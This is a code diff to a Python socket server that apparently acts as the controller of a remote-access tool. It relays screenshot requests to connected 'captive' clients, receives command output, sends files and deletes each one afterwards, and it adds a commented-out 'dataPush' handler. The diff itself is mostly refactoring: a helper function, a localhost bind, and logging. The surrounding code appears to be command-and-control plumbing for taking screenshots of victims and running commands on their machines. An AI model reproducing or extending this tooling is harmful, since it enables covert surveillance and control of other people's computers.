@@ -4,9 +4,15 @@ import os
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind(("0.0.0.0", 5000))
+s.bind(("localhost", 5000))
 
 clients = {}
+
+def opDefiner(data):
+    op = data.split()[1]
+    opSocket = clients.get(op)
+    return op, opSocket
+
 
 def file_sender(client, filename):
     try:
@@ -27,6 +33,8 @@ def file_sender(client, filename):
 
     except FileNotFoundError:
         client.sendall(b"FILE_ERROR File not found\n")
+    finally:
+        os.remove(filename)
 
 def receive_file(client, first_data, filename, file_size):
     received = 0
@@ -129,16 +137,13 @@ def client_listener(client, username):
                 break
 
 
-            datavalue = data.split("> ")[1]
-            #print (f"Received from {username}: {datavalue}")
+            datavalue = data.split("> ")[1].strip()
+            print (f"Received from {username}: {datavalue}")
 
 
             if datavalue.startswith("screenshotFrom"):
                 try:
-                    captiveName = datavalue.split()[1]
-                    # print("CAPTIVENAME:", captiveName)
-
-                    captive = clients.get(captiveName)
+                    captiveName, captive = opDefiner(datavalue)
 
                     if captive is None:
                         client.sendall(
@@ -156,6 +161,13 @@ def client_listener(client, username):
                     print(f"Screenshot error: {type(e).__name__}: {e}")
                     continue
 
+            # elif datavalue.startswith("dataPush"):
+            #     captiveName, captive = opDefiner(datavalue)
+            #     print("DATAVALUE: ", datavalue)
+            #     filename = datavalue.split()[2]
+            #     file_size = datavalue.split()[4]
+            #     print("FILESIZE: ", file_size)
+            #     continue
 
             if datavalue.startswith("CMD_OUTPUT"):
 
